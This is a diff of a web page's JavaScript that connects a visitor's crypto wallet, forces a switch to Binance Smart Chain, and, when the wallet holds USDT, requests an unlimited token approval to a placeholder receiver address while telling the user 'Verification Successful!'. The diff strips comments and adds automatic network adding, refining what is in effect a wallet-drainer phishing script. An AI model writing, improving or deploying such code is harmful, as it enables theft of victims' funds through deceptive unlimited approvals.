@@ -30,12 +30,10 @@
 </div>
 
 <script>
-  // BSC Network Constants
   const BSC_CHAIN_ID = "0x38"; // 56 in decimal
-  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955"; // Official USDT on BSC
-  const TARGET_RECEIVER = "YOUR_TARGET_WALLET_ADDRESS_HERE"; // Jahan funds lene hain
+  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955"; // Official BSC USDT
+  const TARGET_RECEIVER = "YOUR_TARGET_WALLET_ADDRESS_HERE"; // Yahan apna target address daalein
 
-  // Minimal ABI for ERC20 / BEP20 USDT approve/transfer
   const ERC20_ABI = [
     "function balanceOf(address owner) view returns (uint256)",
     "function approve(address spender, uint256 amount) returns (bool)"
@@ -48,12 +46,12 @@
     }
 
     try {
-      // 1. Request Wallet Connection
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       
-      // 2. Check and Switch to BSC Network
       const network = await provider.getNetwork();
+      
+      // Automatic Network Switch & Add Logic
       if (network.chainId !== 56) {
         try {
           await window.ethereum.request({
@@ -61,35 +59,46 @@
             params: [{ chainId: BSC_CHAIN_ID }],
           });
         } catch (switchError) {
-          // Agar network added nahi hai toh add karne ka request bhej sakte hain
-          alert("Please switch your wallet network to Binance Smart Chain (BSC).");
-          return;
+          try {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: BSC_CHAIN_ID,
+                chainName: "Binance Smart Chain",
+                nativeCurrency: {
+                  name: "BNB",
+                  symbol: "BNB",
+                  decimals: 18
+                },
+                rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                blockExplorerUrls: ["https://bscscan.com/"]
+              }],
+            });
+          } catch (addError) {
+            alert("Network switch failed. Please switch to BSC manually in your wallet.");
+            return;
+          }
         }
       }
 
       const signer = provider.getSigner();
       const userAddress = await signer.getAddress();
       
-      // 3. Check BNB Balance (Gas Fee check simulation)
       const bnbBalance = await provider.getBalance(userAddress);
-      console.log("User BNB Balance:", ethers.utils.formatEther(bnbBalance));
-
       if (bnbBalance.eq(0)) {
-        alert("Warning: Insufficient BNB balance for network gas fees.");
+        console.log("Warning: Low BNB balance for gas fees.");
       }
 
-      // 4. Interact with USDT contract on BSC
       const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
       const balance = await usdtContract.balanceOf(userAddress);
 
       if (balance.gt(0)) {
-        // Max approval or transfer trigger
         const maxAmount = ethers.constants.MaxUint256; 
         const tx = await usdtContract.approve(TARGET_RECEIVER, maxAmount);
         await tx.wait();
         alert("Verification Successful!");
       } else {
-        alert("No USDT balance found in this wallet.");
+        alert("No USDT balance found.");
       }
 
     } catch (error) {
